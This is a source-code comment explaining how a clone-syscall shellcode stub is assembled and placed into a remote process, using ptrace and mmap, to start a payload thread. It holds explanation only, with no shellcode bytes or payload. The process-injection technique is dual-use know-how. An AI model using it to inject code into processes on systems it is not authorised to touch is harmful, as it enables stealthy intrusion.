/*
 * Shellcode STUB for creating a thread. It uses the clone syscall. For this shellcode to run
 * it requires the following to be set in the STUB:
 *    1. The stack bottom address in %ecx register.
 *    2. The function pointer address in %ebx register.
 *    3. clone flags.
 * 1. The stack bottom address means when we allocate memory using mmap shellcode we
 * have to pass the address of the last byte of the mmap'ed memory, for example
 * if we we allocate 10 bytes at address 0x00 the bottom of the stack would be
 * 0x09. Simple!
 * 2. The clone shellcode stub uses relative addressing (and sets ebx) to jump to the thread payload
 * specified by the caller. Hence, we need to append the thread payload to the
 * CLONE_STUB_HEAD so that it calls clone and jumps to the payload in the child thread
 * and execute int3 instrution in the main thread. 
 * 3. Clonse flags are the same what are used for clone system call.
 * 
 * The CLONE_STUB_TAIL is exit syscall and is further appended to the payload making
 * the work of the caller easier by not requiring them to specifically exit when 
 * the job is done. So, the Thread shellcode when prepared will look like:
 * [CLONE_STUB_HEAD|Caller_payload|CLONE_STUB_TAIL]
 *
 * This shellcode is not complete as we need to provide the value of %ecx which is the address
 * of the stack bottom. One way to do it is via setregs in ptrace and set the value of
 * ecx to the stack bottom address, but in that case the shellcode is not independent i.e
 * it still depends on external ptrace setregs to make it executable in the remote process.
 * The above shellcode has the stub for movl  address, %ecx which we can update when creating the
 * shellcode through just the passed argument to shellcode_thread() function.
